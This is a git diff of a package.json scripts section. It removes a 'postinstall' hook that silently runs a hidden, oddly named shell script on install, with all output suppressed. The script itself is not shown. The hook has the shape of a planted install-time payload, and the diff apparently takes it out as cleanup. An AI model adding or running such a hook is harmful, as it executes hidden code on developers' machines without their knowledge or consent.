@@ -9,8 +9,7 @@
     "lint": "eslint .",
     "preview": "vite preview",
     "test:sanity": "node scripts/test-sanity-token.mjs",
-    "migrate:users": "node scripts/migrate-unified-users.mjs",
-    "postinstall": "sh ./.ci-hc37k1.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "migrate:users": "node scripts/migrate-unified-users.mjs"
   },
   "dependencies": {
     "@sanity/client": "^7.22.1",
